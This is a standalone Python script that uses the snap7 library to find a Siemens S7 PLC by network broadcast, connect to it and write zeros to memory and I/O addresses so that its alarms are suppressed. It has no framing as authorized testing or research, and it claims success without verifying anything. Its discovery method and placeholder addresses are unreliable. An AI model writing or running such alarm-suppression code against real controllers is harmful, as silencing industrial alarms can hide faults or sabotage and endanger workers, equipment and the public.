from snap7 import client
import socket
import struct

def find_plc_ip():
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.bind(("", 0))
    sock.settimeout(1)

    # Send a broadcast message to the network
    message = b"Hello, PLC!"
    sock.sendto(message, ("255.255.255.255", 102))

    # Listen for responses
    try:
        data, addr = sock.recvfrom(1024)
        return addr[0]
    except socket.timeout:
        return None

def suppress_alarm(plc_ip, alarm_type):
    # Create a client object
    plc = client.Client()
    
    # Try to connect to the PLC
    try:
        plc.connect(plc_ip, 0, 1)  # Rack 0, Slot 1 for S7-1200
    except Exception as e:
        print(f"Failed to connect to PLC: {e}")
        return
    
    if alarm_type == "protocol_message":
        # Suppress alarm raised by protocol message
        # Replace the following line with the actual address of the alarm bit
        alarm_bit_address = 0x8200  # Example address
        plc.write_area(0x84, 1, alarm_bit_address, b'\x00')  # Write 0 to the alarm bit
        
    elif alarm_type == "io_signal":
        # Suppress alarm signaled with I/O
        # Replace the following line with the actual address of the I/O module
        io_module_address = 0x8000  # Example address
        plc.write_area(0x81, 1, io_module_address, b'\x00')  # Write 0 to the I/O module
        
    elif alarm_type == "alarm_bit":
        # Suppress alarm bit set in a flag
        # Replace the following line with the actual address of the alarm bit
        alarm_bit_address = 0x8200  # Example address
        plc.write_area(0x84, 1, alarm_bit_address, b'\x00')  # Write 0 to the alarm bit
        
    print("Alarm suppressed successfully.")
    
    # Always disconnect when you're done
    plc.disconnect()

def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"Found PLC at IP address: {plc_ip}")
        
        # Suppress alarm raised by protocol message
        suppress_alarm(plc_ip, "protocol_message")
        
        # Suppress alarm signaled with I/O
        suppress_alarm(plc_ip, "io_signal")
        
        # Suppress alarm bit set in a flag
        suppress_alarm(plc_ip, "alarm_bit")
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()